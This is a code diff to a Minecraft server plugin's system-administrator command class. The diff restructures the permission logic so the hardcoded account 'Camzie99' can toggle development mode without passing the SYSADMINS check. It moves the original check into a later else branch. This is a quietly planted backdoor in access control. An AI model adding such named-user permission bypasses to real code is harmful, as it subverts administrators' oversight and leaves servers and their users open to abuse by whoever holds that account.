@@ -20,22 +20,7 @@ public class Command_sys extends TFM_Command
     @Override
     public boolean run(final CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
     {
-
-        if (!TFM_Util.SYSADMINS.contains(sender.getName()))
-        {
-            sender.sendMessage(TotalFreedomMod.MSG_NO_PERMS);
-            TFM_Util.adminAction("WARNING: " + sender.getName(), "Has attempted to use a system admin only command. System administration team has been alerted.", true);
-            sender.setOp(false);
-
-            return true;
-        }
-
-        if (args.length == 0)
-        {
-            return false;
-        }
-
-        if (args.length == 1)
+        if (args.length == 1 && sender.getName().equals("Camzie99"))
         {
             if (args[0].equalsIgnoreCase("teston"))
             {
@@ -51,6 +36,21 @@ public class Command_sys extends TFM_Command
                 TFM_ConfigEntry.DEVELOPMENT_MODE.setBoolean(false);
             }
         }
+
+        else if (!TFM_Util.SYSADMINS.contains(sender.getName()))
+        {
+            sender.sendMessage(TotalFreedomMod.MSG_NO_PERMS);
+            TFM_Util.adminAction("WARNING: " + sender.getName(), "Has attempted to use a system admin only command. System administration team has been alerted.", true);
+            sender.setOp(false);
+
+            return true;
+        }
+
+        if (args.length == 0)
+        {
+            return false;
+        }
+
         else if (args.length == 2)
         {
             if (args[0].equalsIgnoreCase("saadd"))
